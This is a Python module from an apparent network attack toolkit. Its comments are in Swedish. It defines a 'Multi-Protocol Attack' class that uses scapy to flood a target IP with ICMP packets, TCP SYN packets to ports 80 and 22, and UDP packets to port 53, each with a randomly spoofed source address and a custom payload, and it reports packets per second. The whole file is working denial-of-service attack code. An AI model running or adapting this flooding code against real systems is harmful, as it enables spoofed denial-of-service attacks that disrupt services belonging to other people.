"""
Multi-Protocol Attack
"""
from scapy.all import IP, TCP, UDP, ICMP, Raw
import time
import random
from .base_attack import BaseAttack
from utils.network_utils import generate_random_ip, generate_random_port


class MultiProtocolAttack(BaseAttack):
    """Kombinerad attack med flera protokoll"""

    def get_attack_name(self):
        return "Multi-Protocol Attack"

    def execute(self, icmp=50, http=50, ssh=50, dns=50):
        """Kör multi-protocol attack"""
        print(f"\n{'='*60}")
        print(f"[!] Startar Multi-Protocol Attack")
        print(f"[!] Target: {self.target_ip}")
        print(f"[!] ICMP: {icmp}, HTTP: {http}, SSH: {ssh}, DNS: {dns}")
        print(f"[!] Message: {self.custom_message}")
        print(f"{'='*60}\n")

        self.packets_sent = 0
        self.start_time = time.time()

        for i in range(max(icmp, http, ssh, dns)):
            if i < icmp:
                payload = f"{self.custom_message}_ICMP_{i+1}".encode()
                packet = IP(src=generate_random_ip(), dst=self.target_ip)/ICMP()/Raw(load=payload)
                self.send_packet(packet)

            if i < http:
                payload = f"{self.custom_message}_HTTP_{i+1}".encode()
                packet = IP(src=generate_random_ip(), dst=self.target_ip)/ \
                         TCP(sport=generate_random_port(), dport=80, flags="S", seq=random.randint(1000, 9000))/ \
                         Raw(load=payload)
                self.send_packet(packet)

            if i < ssh:
                payload = f"{self.custom_message}_SSH_{i+1}".encode()
                packet = IP(src=generate_random_ip(), dst=self.target_ip)/ \
                         TCP(sport=generate_random_port(), dport=22, flags="S", seq=random.randint(1000, 9000))/ \
                         Raw(load=payload)
                self.send_packet(packet)

            if i < dns:
                payload = f"{self.custom_message}_DNS_{i+1}".encode()
                packet = IP(src=generate_random_ip(), dst=self.target_ip)/ \
                         UDP(sport=generate_random_port(), dport=53)/ \
                         Raw(load=payload)
                self.send_packet(packet)

            if (i + 1) % 25 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] Multi: {self.packets_sent} paket skickade ({pps:.1f} pps)")

        self.log_attack("MULTI_PROTOCOL", 
                       f"ICMP:{icmp} HTTP:{http} SSH:{ssh} DNS:{dns} - Message: {self.custom_message}")
        self.print_summary()
